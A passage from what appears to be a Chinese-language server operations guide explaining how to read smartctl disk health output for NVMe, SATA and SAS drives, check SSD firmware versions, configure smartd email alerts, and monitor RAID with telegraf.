Number:                      PHKA119600MK2P0D\nFirmware Version:                   002C\nPCI Vendor/Subsystem ID:            0x8086\nIEEE OUI Identifier:                0x5cd2e4\nController ID:                      1\nNVMe Version:                       1.4\nNumber of Namespaces:               1\nNamespace 1 Size/Capacity:          2,048,408,248,320 [2.04 TB]\nNamespace 1 Formatted LBA Size:     512\nLocal Time is:                      Mon Feb 26 21:59:27 2024 CST\nFirmware Updates (0x14):            2 Slots, no Reset required\nOptional Admin Commands (0x0017):   Security Format Frmw_DL Self_Test\nOptional NVM Commands (0x005f):     Comp Wr_Unc DS_Mngmt Wr_Zero Sav/Sel_Feat Timestmp\nLog Page Attributes (0x0f):         S/H_per_NS Cmd_Eff_Lg Ext_Get_Lg Telmtry_Lg\nMaximum Data Transfer Size:         64 Pages\nWarning  Comp. Temp. Threshold:     77 Celsius\nCritical Comp. Temp. Threshold:     80 Celsius\n\nSupported Power States\nSt Op     Max   Active     Idle   RL RT WL WT  Ent_Lat  Ex_Lat\n0 +     5.50W       -        -    0  0  0  0        0       0\n1 +     3.60W       -        -    1  1  1  1        0       0\n2 +     2.60W       -        -    2  2  2  2        0       0\n3 -   0.0250W       -        -    3  3  3  3     5000    5000\n4 -   0.0040W       -        -    4  4  4  4     3000   11999\n\nSupported LBA Sizes (NSID 0x1)\nId Fmt  Data  Metadt  Rel_Perf\n0 +     512       0         0\n</code></pre> \u200b\u4e00\u5757\u200b SATA SSD \u200b\u7684\u200b\u4fe1\u606f\u200b\u793a\u4f8b\u200b <pre><code>=== START OF INFORMATION SECTION ===\nModel Family:     Intel S4510/S4610/S4500/S4600 Series SSDs\nDevice Model:     INTEL SSDSC2KB019T8\nSerial Number:    PHYF8314006P1P9DGM\nLU WWN Device Id: 5 5cd2e4 14fa8880b\nFirmware Version: XCV10165\nUser Capacity:    1,920,383,410,176 bytes [1.92 TB]\nSector Sizes:     512 bytes logical, 4096 bytes physical\nRotation Rate:    Solid State Device\nForm Factor:      2.5 inches\nTRIM Command:     Available, deterministic, zeroed\nDevice is:        In smartctl database [for details use: -P show]\nATA Version is:   ACS-3 T13/2161-D revision 5\nSATA Version is:  SATA 3.2, 6.0 Gb/s (current: 6.0 Gb/s)\nLocal Time is:    Mon Feb 26 22:13:57 2024 CST\nSMART support is: Available - device has SMART capability.\nSMART support is: Enabled\n</code></pre> \u200b\u4e00\u5757\u200b SATA HDD \u200b\u7684\u200b\u4fe1\u606f\u200b\u793a\u4f8b\u200b <pre><code>=== START OF INFORMATION SECTION ===\nModel Family:     Hitachi Ultrastar A7K2000\nDevice Model:     Hitachi HUA722020ALA330\nSerial Number:    JK11A4B8KKLUDX\nLU WWN Device Id: 5 000cca 222f24777\nFirmware Version: JKAOA3EA\nUser Capacity:    2,000,398,934,016 bytes [2.00 TB]\nSector Size:      512 bytes logical/physical\nRotation Rate:    7200 rpm\nForm Factor:      3.5 inches\nDevice is:        In smartctl database [for details use: -P show]\nATA Version is:   ATA8-ACS T13/1699-D revision 4\nSATA Version is:  SATA 2.6, 3.0 Gb/s\nLocal Time is:    Mon Feb 26 22:15:41 2024 CST\nSMART support is: Available - device has SMART capability.\nSMART support is: Enabled\n</code></pre> \u200b\u4e00\u5757\u200b SAS HDD \u200b\u7684\u200b\u4fe1\u606f\u200b\u793a\u4f8b\u200b <pre><code>=== START OF INFORMATION SECTION ===\nVendor:               WDC\nProduct:              WUH721818AL5206\nRevision:             C240\nCompliance:           SPC-5\nUser Capacity:        18,000,207,937,536 bytes [18.0 TB]\nLogical block size:   512 bytes\nPhysical block size:  4096 bytes\nLU is fully provisioned\nRotation Rate:        7200 rpm\nForm Factor:          3.5 inches\nLogical Unit id:      0x5000cca2a909e560\nSerial number:        3JG5ER6G\nDevice type:          disk\nTransport protocol:   SAS (SPL-4)\nLocal Time is:        Mon Feb 26 22:21:06 2024 CST\nSMART support is:     Available - device has SMART capability.\nSMART support is:     Enabled\nTemperature Warning:  Enabled\n</code></pre> <p>\u200b\u68c0\u67e5\u200b\u786c\u76d8\u200b\u7684\u200b\u56fa\u4ef6\u200b\u7248\u672c\u200b</p> <p>\u200b\u6570\u636e\u4e2d\u5fc3\u200b\u76d8\u200b\u7684\u200b SSD \u200b\u8fd1\u5e74\u6765\u200b\u6709\u591a\u8d77\u200b\u56e0\u4e3a\u200b\u56fa\u4ef6\u200b\u95ee\u9898\u200b\u5bfc\u81f4\u200b\u4f7f\u7528\u200b\u65f6\u95f4\u200b\u8fc7\u957f\u200b\uff08\u200b\u51e0\u4e07\u200b\u5c0f\u65f6\u200b\uff09\u200b\u540e\u76d8\u200b\u574f\u6389\u200b\u7684\u200b\u65b0\u95fb\u200b\uff1a</p> <ul> <li>Time to Patch: HPE SSDs Will Fail After 32,768 Hours</li> <li>SSD drives' 40,000-hour \"death bug\" continues to catch enterprises unawares</li> </ul> <p>\u200b\u5bf9\u4e8e\u200b\u670d\u52a1\u5668\u200b\u573a\u666f\u200b\uff0c\u200b\u8fd9\u200b\u7c7b\u200b\u4e8b\u4ef6\u200b\u4e00\u65e6\u200b\u53d1\u751f\u200b\uff0c\u200b\u540e\u679c\u200b\u6781\u5176\u200b\u4e25\u91cd\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u914d\u7f6e\u200b\u65b0\u200b\u670d\u52a1\u5668\u65f6\u200b\uff0c\u200b\u5f88\u591a\u200b\u65f6\u5019\u200b\u4f7f\u7528\u200b\u7684\u200b\u76d8\u200b\u578b\u53f7\u200b\u662f\u200b\u4e00\u6837\u200b\u7684\u200b\uff0c\u200b\u5bfc\u81f4\u200b\u5f00\u673a\u200b\u65f6\u95f4\u200b\u4e5f\u200b\u662f\u200b\u4e00\u6837\u200b\u7684\u200b\uff0c \u200b\u56e0\u6b64\u200b\u51fa\u73b0\u200b\u95ee\u9898\u200b\u4e4b\u540e\u200b\uff0c\u200b\u6240\u6709\u200b\u76d8\u200b\u90fd\u200b\u4f1a\u200b\u5728\u200b\u77ed\u65f6\u95f4\u200b\u5185\u200b\u574f\u6389\u200b\uff0cRAID \u200b\u7684\u200b\u5197\u4f59\u200b\u518d\u200b\u9ad8\u200b\u4e5f\u200b\u65e0\u529b\u56de\u5929\u200b\u3002</p> <p>\u200b\u5373\u4f7f\u200b\u662f\u200b\u9762\u5411\u200b\u4e2a\u4eba\u7528\u6237\u200b\u7684\u200b\u4ea7\u54c1\u200b\uff0c\u200b\u4e5f\u200b\u51fa\u73b0\u200b\u8fc7\u200b\u56fa\u4ef6\u200b\u95ee\u9898\u200b\u5bfc\u81f4\u200b SSD \u200b\u5728\u200b\u77ed\u65f6\u95f4\u200b\u5185\u200b\u635f\u574f\u200b\u7684\u200b\u60c5\u51b5\u200b\u3002 \u200b\u56e0\u6b64\u200b\u68c0\u67e5\u200b\u56fa\u4ef6\u200b\u7248\u672c\u200b\uff08\u200b\u4ee5\u53ca\u200b\u5173\u6ce8\u200b\u76f8\u5173\u200b\u4fe1\u606f\u200b\uff09\u200b\u662f\u200b\u975e\u5e38\u200b\u91cd\u8981\u200b\u7684\u200b\u3002<code>smartctl</code> \u200b\u63d0\u4f9b\u200b\u7684\u200b\u4fe1\u606f\u200b\u4e2d\u200b\u5305\u542b\u200b\u4e86\u200b\u56fa\u4ef6\u200b\u7248\u672c\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u4f5c\u200b\u641c\u7d22\u200b\u3001\u200b\u81ea\u67e5\u200b\u7684\u200b\u53c2\u8003\u200b\u3002</p> <p>\u200b\u4e00\u90e8\u5206\u200b\u5382\u5546\u200b\u63d0\u4f9b\u200b\u4e86\u200b fwupd \u200b\u652f\u6301\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u8fdb\u884c\u200b\u56fa\u4ef6\u200b\u7248\u672c\u200b\u7684\u200b\u68c0\u67e5\u200b\u4e0e\u200b\u5347\u7ea7\u200b\uff1b\u200b\u800c\u200b\u53e6\u200b\u4e00\u4e9b\u200b\u5c31\u200b\u9700\u8981\u200b\u81ea\u5df1\u200b\u53bb\u200b\u641c\u7d22\u200b\u76f8\u5173\u200b\u5de5\u5177\u200b\u8fdb\u884c\u200b\u5347\u7ea7\u200b\u3002 \u200b\u6211\u4eec\u200b\u7684\u200b\u6587\u6863\u200b\u8bb0\u5f55\u200b\u4e86\u200b\u5728\u200b\u4e24\u5757\u200b\u76d8\u200b\u9047\u5230\u200b\u56fa\u4ef6\u200b\u5bfc\u81f4\u200b\u7684\u200b\u635f\u574f\u200b\u540e\u200b\u5347\u7ea7\u200b Intel SSD \u200b\u56fa\u4ef6\u200b\uff08XCV10100 -&gt; XCV10110\uff09\u200b\u7684\u200b\u60e8\u75db\u200b\u7ecf\u5386\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f5c\u4e3a\u200b\u53c2\u8003\u200b\u3002</p> <p>Smart data section \u200b\u5219\u200b\u5c55\u793a\u200b\u4e86\u200b\u786c\u76d8\u200b\u7684\u200b SMART \u200b\u4fe1\u606f\u200b\u3002\u200b\u5176\u4e2d\u200b\u81ea\u68c0\u200b\u4fe1\u606f\u200b\u4e0e\u200b\u9519\u8bef\u200b\u8bb0\u5f55\u200b\u5747\u4f1a\u200b\u663e\u793a\u200b\uff0c\u200b\u5176\u4ed6\u200b\u7684\u200b\u90e8\u5206\u200b\u89c6\u200b\u786c\u76d8\u200b\u7c7b\u578b\u200b\u800c\u5b9a\u200b\u3002</p> \u200b\u4e00\u5757\u200b NVMe SSD \u200b\u7684\u200b SMART \u200b\u6570\u636e\u200b\u793a\u4f8b\u200b <pre><code>=== START OF SMART DATA SECTION ===\nSMART overall-health self-assessment test result: PASSED\n\nSMART/Health Information (NVMe Log 0x02)\nCritical Warning:                   0x00\nTemperature:                        38 Celsius\nAvailable Spare:                    100%\nAvailable Spare Threshold:          10%\nPercentage Used:                    2%\nData Units Read:                    84,073,721 [43.0 TB]\nData Units Written:                 61,243,095 [31.3 TB]\nHost Read Commands:                 447,275,235\nHost Write Commands:                1,184,078,579\nController Busy Time:               9,203\nPower Cycles:                       77\nPower On Hours:                     14,101\nUnsafe Shutdowns:                   25\nMedia and Data Integrity Errors:    0\nError Information Log Entries:      0\nWarning  Comp. Temperature Time:    0\nCritical Comp. Temperature Time:    0\n\nError Information (NVMe Log 0x01, 16 of 256 entries)\nNo Errors Logged\n\nRead Self-test Log failed: Invalid Field in Command (0x002)\n</code></pre> <p>\u200b\u5bf9\u4e8e\u200b NVMe SSD \u200b\u6765\u8bf4\u200b\uff0c\u200b\u5173\u6ce8\u200b\u7684\u200b\u91cd\u70b9\u200b\u662f\u200b\uff1a</p> <ul> <li>\u200b\u5199\u5165\u200b\u91cf\u200b\u4e0e\u200b\u5bff\u547d\u200b\uff1aAvailable Spare\u3001Percentage Used\u3001Data Units Written</li> <li>\u200b\u51fa\u73b0\u200b\u9519\u8bef\u200b\u7684\u200b\u6b21\u6570\u200b\uff1aMedia and Data Integrity Errors\uff08\u200b\u4e5f\u200b\u5c31\u662f\u200b\u4fd7\u79f0\u200b\u7684\u200b 0E \u200b\u9519\u8bef\u200b\u6570\u91cf\u200b\uff09\u3002\u200b\u5982\u679c\u200b\u8fd9\u4e2a\u200b\u6570\u5b57\u200b\u4e0d\u662f\u200b 0\uff0c\u200b\u9700\u8981\u200b\u7acb\u523b\u200b\u5907\u4efd\u200b\u6570\u636e\u200b\u5e76\u4e14\u200b\u8003\u8651\u200b\u66f4\u6362\u200b\uff01</li> </ul> \u200b\u4e00\u5757\u200b SATA SSD \u200b\u7684\u200b SMART \u200b\u6570\u636e\u200b\u793a\u4f8b\u200b <pre><code>=== START OF READ SMART DATA SECTION ===\nSMART overall-health self-assessment test result: PASSED\n\nGeneral SMART Values:\nOffline data collection status:  (0x00) Offline data collection activity\n                    was never started.\n                    Auto Offline Data Collection: Disabled.\nSelf-test execution status:      (   0) The previous self-test routine completed\n                    without error or no self-test has ever \n                    been run.\nTotal time to complete Offline \ndata collection:        (    0) seconds.\nOffline data collection\ncapabilities:            (0x79) SMART execute Offline immediate.\n                    No Auto Offline data collection support.\n                    Suspend Offline collection upon new\n                    command.\n                    Offline surface scan supported.\n                    Self-test supported.\n                    Conveyance Self-test supported.\n                    Selective Self-test supported.\nSMART capabilities:            (0x0003) Saves SMART data before entering\n                    power-saving mode.\n                    Supports SMART auto save timer.\nError logging capability:        (0x01) Error logging supported.\n                    General Purpose Logging supported.\nShort self-test routine \nrecommended polling time:    (   1) minutes.\nExtended self-test routine\nrecommended polling time:    (   2) minutes.\nConveyance self-test routine\nrecommended polling time:    (   2) minutes.\nSCT capabilities:          (0x003d) SCT Status supported.\n                    SCT Error Recovery Control supported.\n                    SCT Feature Control supported.\n                    SCT Data Table supported.\n\nSMART Attributes Data Structure revision number: 1\nVendor Specific SMART Attributes with Thresholds:\nID# ATTRIBUTE_NAME          FLAG     VALUE WORST THRESH TYPE      UPDATED  WHEN_FAILED RAW_VALUE\n5 Reallocated_Sector_Ct   0x0032   100   100   000    Old_age   Always       -       0\n9 Power_On_Hours          0x0032   100   100   000    Old_age   Always       -       41492\n12 Power_Cycle_Count       0x0032   100   100   000    Old_age   Always       -       22\n170 Available_Reservd_Space 0x0033   100   100   010    Pre-fail  Always       -       0\n171 Program_Fail_Count      0x0032   100   100   000    Old_age   Always       -       0\n172 Erase_Fail_Count        0x0032   100   100   000    Old_age   Always       -       0\n174 Unsafe_Shutdown_Count   0x0032   100   100   000    Old_age   Always       -       18\n175 Power_Loss_Cap_Test     0x0033   100   100   010    Pre-fail  Always       -       2561 (22 65535)\n183 SATA_Downshift_Count    0x0032   100   100   000    Old_age   Always       -       0\n184 End-to-End_Error_Count  0x0033   100   100   090    Pre-fail  Always       -       0\n187 Uncorrectable_Error_Cnt 0x0032   100   100   000    Old_age   Always       -       0\n190 Drive_Temperature       0x0022   079   073   000    Old_age   Always       -       21 (Min/Max 19/27)\n192 Unsafe_Shutdown_Count   0x0032   100   100   000    Old_age   Always       -       18\n194 Temperature_Celsius     0x0022   100   100   000    Old_age   Always       -       21\n197 Pending_Sector_Count    0x0012   100   100   000    Old_age   Always       -       0\n199 CRC_Error_Count         0x003e   100   100   000    Old_age   Always       -       0\n225 Host_Writes_32MiB       0x0032   100   100   000    Old_age   Always       -       1627966\n226 Workld_Media_Wear_Indic 0x0032   100   100   000    Old_age   Always       -       1177\n227 Workld_Host_Reads_Perc  0x0032   100   100   000    Old_age   Always       -       20\n228 Workload_Minutes        0x0032   100   100   000    Old_age   Always       -       2489558\n232 Available_Reservd_Space 0x0033   100   100   010    Pre-fail  Always       -       0\n233 Media_Wearout_Indicator 0x0032   099   099   000    Old_age   Always       -       0\n234 Thermal_Throttle_Status 0x0032   100   100   000    Old_age   Always       -       0/0\n235 Power_Loss_Cap_Test     0x0033   100   100   010    Pre-fail  Always       -       2561 (22 65535)\n241 Host_Writes_32MiB       0x0032   100   100   000    Old_age   Always       -       1627966\n242 Host_Reads_32MiB        0x0032   100   100   000    Old_age   Always       -       407022\n243 NAND_Writes_32MiB       0x0032   100   100   000    Old_age   Always       -       8173747\n\nSMART Error Log Version: 1\nNo Errors Logged\n\nSMART Self-test log structure revision number 1\nNo self-tests have been logged.  [To run self-tests, use: smartctl -t]\n\nSMART Selective self-test log data structure revision number 1\nSPAN  MIN_LBA  MAX_LBA  CURRENT_TEST_STATUS\n    1        0        0  Not_testing\n    2        0        0  Not_testing\n    3        0        0  Not_testing\n    4        0        0  Not_testing\n    5        0        0  Not_testing\nSelective self-test flags (0x0):\nAfter scanning selected spans, do NOT read-scan remainder of disk.\nIf Selective self-test is pending on power-up, resume after 0 minute delay.\n</code></pre> <p>\u200b\u8fd9\u91cc\u200b\u4e3b\u8981\u200b\u5173\u6ce8\u200b attributes \u200b\u8868\u4e2d\u200b\u7684\u200b\u503c\u200b\u3002Attributes \u200b\u5206\u4e3a\u200b\u4e24\u7c7b\u200b\uff0c\"Pre-fail\" \u200b\u4ee3\u8868\u200b\u5176\u200b\u5f02\u5e38\u200b\u9884\u793a\u200b\u7740\u200b\u786c\u76d8\u200b\u4f1a\u200b\u5728\u200b\u4e0d\u4e45\u200b\u7684\u200b\u5c06\u6765\u200b\u51fa\u73b0\u200b\u95ee\u9898\u200b\uff0c\"Old_age\" \u200b\u5219\u200b\u8868\u793a\u200b\u786c\u76d8\u200b\u968f\u200b\u65f6\u95f4\u200b\u8001\u5316\u200b\u7684\u200b\u6307\u6807\u200b\u3002 Value \u200b\u4e3a\u200b 100\uff08\u200b\u6709\u4e9b\u200b\u786c\u76d8\u200b\u7684\u200b\u8d77\u59cb\u503c\u200b\u4f1a\u200b\u66f4\u200b\u9ad8\u200b\uff09\u200b\u901a\u5e38\u200b\u8868\u793a\u200b\u6700\u4f73\u200b\u6307\u6807\u200b\uff0c\u200b\u968f\u7740\u200b\u4f7f\u7528\u200b\u9010\u6e10\u200b\u964d\u4f4e\u200b\u3002Worst \u200b\u5219\u200b\u8bb0\u5f55\u200b\u5386\u53f2\u200b\u6700\u5dee\u200b\uff08\u200b\u6700\u4f4e\u200b\uff09\u200b\u503c\u200b\uff0c\u200b\u5982\u679c\u200b\u503c\u200b\u4f4e\u4e8e\u200b\u9608\u503c\u200b\uff08Threshold\uff09\uff0c\u200b\u5219\u200b\u4ee3\u8868\u200b\u786c\u76d8\u200b\u51fa\u73b0\u200b\u4e86\u200b\u95ee\u9898\u200b\u3002</p> <p>\u200b\u5bf9\u4e8e\u200b SSD \u200b\u6765\u8bf4\u200b\uff0c\u200b\u9664\u4e86\u200b Pre-fail \u200b\u4ee5\u5916\u200b\uff0c\u200b\u9700\u8981\u200b\u989d\u5916\u200b\u5173\u6ce8\u200b\u4e0e\u200b wearout\uff08\u200b\u78e8\u635f\u200b\uff09\u200b\u6709\u5173\u200b\u7684\u200b\u6307\u6807\u200b\u3002</p> \u200b\u4e00\u5757\u200b SATA HDD \u200b\u7684\u200b SMART \u200b\u6570\u636e\u200b\u793a\u4f8b\u200b <pre><code>=== START OF READ SMART DATA SECTION ===\nSMART Status not supported: ATA return descriptor not supported by controller firmware\nSMART overall-health self-assessment test result: PASSED\nWarning: This result is based on an Attribute check.\n\nGeneral SMART Values:\nOffline data collection status:  (0x82) Offline data collection activity\n                    was completed without error.\n                    Auto Offline Data Collection: Enabled.\nSelf-test execution status:      (   0) The previous self-test routine completed\n                    without error or no self-test has ever \n                    been run.\nTotal time to complete Offline \ndata collection:        (21007) seconds.\nOffline data collection\ncapabilities:            (0x5b) SMART execute Offline immediate.\n                    Auto Offline data collection on/off support.\n                    Suspend Offline collection upon new\n                    command.\n                    Offline surface scan supported.\n                    Self-test supported.\n                    No Conveyance Self-test supported.\n                    Selective Self-test supported.\nSMART capabilities:            (0x0003) Saves SMART data before entering\n                    power-saving mode.\n                    Supports SMART auto save timer.\nError logging capability:        (0x01) Error logging supported.\n                    General Purpose Logging supported.\nShort self-test routine \nrecommended polling time:    (   1) minutes.\nExtended self-test routine\nrecommended polling time:    ( 350) minutes.\nSCT capabilities:          (0x003d) SCT Status supported.\n                    SCT Error Recovery Control supported.\n                    SCT Feature Control supported.\n                    SCT Data Table supported.\n\nSMART Attributes Data Structure revision number: 16\nVendor Specific SMART Attributes with Thresholds:\nID# ATTRIBUTE_NAME          FLAG     VALUE WORST THRESH TYPE      UPDATED  WHEN_FAILED RAW_VALUE\n1 Raw_Read_Error_Rate     0x000b   100   100   016    Pre-fail  Always       -       0\n2 Throughput_Performance  0x0005   133   133   054    Pre-fail  Offline      -       102\n3 Spin_Up_Time            0x0007   119   119   024    Pre-fail  Always       -       604 (Average 610)\n4 Start_Stop_Count        0x0012   100   100   000    Old_age   Always       -       104\n5 Reallocated_Sector_Ct   0x0033   100   100   005    Pre-fail  Always       -       0\n7 Seek_Error_Rate         0x000b   100   100   067    Pre-fail  Always       -       0\n8 Seek_Time_Performance   0x0005   121   121   020    Pre-fail  Offline      -       35\n9 Power_On_Hours          0x0012   084   084   000    Old_age   Always       -       113016\n10 Spin_Retry_Count        0x0013   100   100   060    Pre-fail  Always       -       0\n12 Power_Cycle_Count       0x0032   100   100   000    Old_age   Always       -       104\n192 Power-Off_Retract_Count 0x0032   100   100   000    Old_age   Always       -       129\n193 Load_Cycle_Count        0x0012   100   100   000    Old_age   Always       -       129\n194 Temperature_Celsius     0x0002   181   181   000    Old_age   Always       -       33 (Min/Max 17/56)\n196 Reallocated_Event_Count 0x0032   100   100   000    Old_age   Always       -       0\n197 Current_Pending_Sector  0x0022   100   100   000    Old_age   Always       -       0\n198 Offline_Uncorrectable   0x0008   100   100   000    Old_age   Offline      -       0\n199 UDMA_CRC_Error_Count    0x000a   200   200   000    Old_age   Always       -       1\n\nSMART Error Log Version: 0\nNo Errors Logged\n\nSMART Self-test log structure revision number 1\nNo self-tests have been logged.  [To run self-tests, use: smartctl -t]\n\nSMART Selective self-test log data structure revision number 1\nSPAN  MIN_LBA  MAX_LBA  CURRENT_TEST_STATUS\n    1        0        0  Not_testing\n    2        0        0  Not_testing\n    3        0        0  Not_testing\n    4        0        0  Not_testing\n    5        0        0  Not_testing\nSelective self-test flags (0x0):\nAfter scanning selected spans, do NOT read-scan remainder of disk.\nIf Selective self-test is pending on power-up, resume after 0 minute delay.\n</code></pre> <p>\u200b\u9605\u8bfb\u200b attributes \u200b\u7684\u200b\u65b9\u6cd5\u200b\u53c2\u89c1\u200b\u4e0a\u9762\u200b\u7684\u200b SATA SSD \u200b\u7684\u200b\u793a\u4f8b\u200b\u3002</p> \u200b\u4e00\u5757\u200b SAS HDD \u200b\u7684\u200b SMART \u200b\u6570\u636e\u200b\u793a\u4f8b\u200b <pre><code>=== START OF READ SMART DATA SECTION ===\nSMART Health Status: OK\n\nGrown defects during certification &lt;not available&gt;\nTotal blocks reassigned during format &lt;not available&gt;\nTotal new blocks reassigned &lt;not available&gt;\nPower on minutes since format &lt;not available&gt;\nCurrent Drive Temperature:     26 C\nDrive Trip Temperature:        85 C\n\nAccumulated power on time, hours:minutes 3632:21\nManufactured in week 44 of year 2021\nSpecified cycle count over device lifetime:  50000\nAccumulated start-stop cycles:  6\nSpecified load-unload count over device lifetime:  600000\nAccumulated load-unload cycles:  155\nElements in grown defect list: 0\n\nError counter log:\n        Errors Corrected by           Total   Correction     Gigabytes    Total\n            ECC          rereads/    errors   algorithm      processed    uncorrected\n        fast | delayed   rewrites  corrected  invocations   [10^9 bytes]  errors\nread:          0        0         0         0          3       1235.896           0\nwrite:         0        0         0         0         30        595.461           0\nverify:        0        0         0         0         28          0.000           0\n\nNon-medium error count:        0\n\nNo Self-tests have been logged\n</code></pre> <p>SMART \u200b\u8fd8\u200b\u652f\u6301\u200b\u8ba9\u200b\u78c1\u76d8\u200b\u81ea\u68c0\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u7684\u200b\u53c2\u6570\u200b\u4e3a\u200b <code>smartctl -t</code>\uff0c\u200b\u53ef\u4ee5\u200b\u9009\u62e9\u200b\u4e0d\u540c\u200b\u7684\u200b\u6d4b\u8bd5\u200b\u53c2\u6570\u200b\uff08\u200b\u4f8b\u5982\u200b short\u3001long \u200b\u7b49\u200b\uff09\uff0c\u200b\u8be6\u60c5\u200b\u53ef\u200b\u53c2\u8003\u200b <code>smartctl(8)</code> \u200b\u7684\u200b \"SMART RUN/ABORT OFFLINE TEST AND SELF-TEST OPTIONS\" \u200b\u90e8\u5206\u200b\u3002</p> <p>\u200b\u5b89\u88c5\u200b smartmontools \u200b\u4e4b\u540e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u542f\u7528\u200b smartd \u200b\u670d\u52a1\u200b\uff08smartd.service \u200b\u6216\u200b smartmontools.service\uff09\u3002 \u200b\u8be5\u200b\u670d\u52a1\u200b\u4f1a\u200b\u6bcf\u9694\u200b\u4e00\u6bb5\u65f6\u95f4\u200b\u68c0\u67e5\u200b\u786c\u76d8\u200b\u7684\u200b SMART \u200b\u4fe1\u606f\u200b\uff0c\u200b\u5e76\u200b\u5728\u200b\u53d1\u73b0\u200b\u95ee\u9898\u200b\u65f6\u200b\u53d1\u9001\u200b\u90ae\u4ef6\u200b\u901a\u77e5\u200b\u7ba1\u7406\u5458\u200b\uff08\u200b\u5728\u200b\u6b63\u786e\u200b\u914d\u7f6e\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff09\u3002 \u200b\u9ed8\u8ba4\u200b Debian \u200b\u63d0\u4f9b\u200b\u7684\u200b <code>/etc/smartd.conf</code> \u200b\u7684\u200b\u6709\u6548\u200b\u5185\u5bb9\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>DEVICESCAN -d removable -n standby -m root -M exec /usr/share/smartmontools/smartd-runner\n</code></pre> <p><code>/usr/share/smartmontools/smartd-runner</code> \u200b\u4f1a\u200b\u8c03\u7528\u200b <code>/etc/smartmontools/run.d/</code> \u200b\u4e0b\u200b\u7684\u200b\u6587\u4ef6\u200b\uff0c \u200b\u5176\u4e2d\u200b\u9ed8\u8ba4\u200b\u63d0\u4f9b\u200b\u7684\u200b <code>10mail</code> \u200b\u4f1a\u200b\u4f7f\u7528\u200b\u7cfb\u7edf\u200b\u7684\u200b <code>mail</code> \u200b\u547d\u4ee4\u200b\u53d1\u9001\u200b\u90ae\u4ef6\u200b\u3002</p> \u200b\u90ae\u4ef6\u200b\u6837\u4f8b\u200b <pre><code>This message was generated by the smartd daemon running on:\n\n   host name:  example\n   DNS domain: vm.example.org\n\nThe following warning/error was logged by the smartd daemon:\n\nDevice: /dev/sdh [SAT], FAILED SMART self-check. BACK UP DATA NOW!\n\nDevice info:\nINTEL SSDSC2KB019T8, S/N:PHYF830400R01P9DGM, WWN:5-5cd2e4-14fa2d6ae, FW:XCV10165, 1.92 TB\n\nFor details see host's SYSLOG.\n\nYou can also use the smartctl utility for further investigation.\nThe original message about this issue was sent at Fri Jan 12 02:51:00 2024 CST\nAnother message will be sent in 24 hours if the problem persists.\n</code></pre> <p>\u200b\u5728\u200b\u914d\u7f6e\u200b\u4e2d\u200b\u6dfb\u52a0\u200b <code>-M test</code> \u200b\u53ef\u4ee5\u200b\u5728\u200b\u542f\u52a8\u200b\u65f6\u200b\u53d1\u9001\u200b\u6d4b\u8bd5\u200b\u90ae\u4ef6\u200b\u3002\u200b\u66f4\u200b\u591a\u200b\u914d\u7f6e\u200b\u8be6\u60c5\u8bf7\u200b\u53c2\u8003\u200b <code>smartd.conf(5)</code>\u3002</p>"},{"location":"ops/storage/raid/#raid-info","title":"RAID \u200b\u4fe1\u606f","text":"<p>Linux \u200b\u7cfb\u7edf\u200b\u4e0b\u200b\u7684\u200b\u8f6f\u4ef6\u200b RAID \u200b\u65b9\u6848\u200b\u4e00\u822c\u200b\u90fd\u200b\u4f1a\u200b\u63d0\u4f9b\u200b\u4f7f\u7528\u200b\u90ae\u4ef6\u200b\u901a\u77e5\u200b\u7ba1\u7406\u5458\u200b\u5f02\u5e38\u60c5\u51b5\u200b\u7684\u200b\u529f\u80fd\u200b\u3002 mdadm \u200b\u4e0e\u200b ZFS \u200b\u65b9\u6848\u200b\u5747\u200b\u652f\u6301\u200b\u90ae\u4ef6\u200b\u901a\u77e5\u200b\u3002\u200b\u800c\u200b LVM \u200b\u4e0d\u200b\u5305\u542b\u200b\u8fd9\u6837\u200b\u7684\u200b\u529f\u80fd\u200b\uff0c\u200b\u9700\u8981\u200b\u7cfb\u7edf\u7ba1\u7406\u5458\u200b\u989d\u5916\u200b\u8bbe\u7f6e\u200b\u5b9a\u65f6\u200b\u4efb\u52a1\u200b\u6765\u200b\u68c0\u67e5\u200b\u3002</p> <p>\u200b\u9664\u4e86\u200b\u5728\u200b\u5f02\u5e38\u60c5\u51b5\u200b\u4e0b\u200b\u53d1\u9001\u200b\u90ae\u4ef6\u200b\u901a\u77e5\u200b\uff0c\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u76f8\u5173\u200b\u7684\u200b\u6307\u6807\u200b\u76d1\u63a7\u200b\u5de5\u5177\u200b\u6765\u200b\u76d1\u63a7\u200b RAID \u200b\u4ee5\u53ca\u200b\u786c\u76d8\u200b SMART \u200b\u7b49\u200b\u4fe1\u606f\u200b\u3002 \u200b\u4ee5\u200b telegraf \u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u81ea\u5e26\u200b\u7684\u200b\u4e0e\u200b\u5065\u5eb7\u200b\u5ea6\u200b\u76f8\u5173\u200b\u7684\u200b\u63d2\u4ef6\u200b\u5305\u62ec\u200b mdstat (mdadm) \u200b\u4e0e\u200b smart\u3002 \u200b\u7f16\u5199\u200b\u81ea\u5df1\u200b\u7684\u200b\u76d1\u63a7\u200b\u63d2\u4ef6\u200b\u4e5f\u200b\u5f88\u200b\u65b9\u4fbf\u200b\u3002</p> <p>USTCLUG \u200b\u76ee\u524d\u200b\u7684\u200b\u65b9\u6848\u200b</p> <p>\u200b\u6211\u4eec\u200b\u7684\u200b RAID \u200b\u76ee\u524d\u200b\u4e3b\u8981\u200b\u6709\u200b ZFS (zpool) \u200b\u4e0e\u200b\u786c\u4ef6\u200b RAID \u200b\u4e24\u79cd\u200b\u3002\u200b\u524d\u8005\u200b\u6211\u4eec\u200b\u4f7f\u7528\u200b\u7684\u200b\u65b9\u6848\u200b\u662f\u200b https://github.com/iwvelando/telegraf-exec-zpool-status\uff0c \u200b\u800c\u200b\u540e\u8005\u200b\u662f\u200b @taoky \u200b\u7f16\u5199\u200b\u7684\u200b raid-telegraf\u3002</p> <p>\u200b\u53ef\u200b\u7528\u4e8e\u200b\u5bfc\u5165\u200b\u7684\u200b Grafana.com Dashboard \u200b\u5206\u4eab\u200b\u9875\u9762\u200b\uff0cGrafana Dashboard 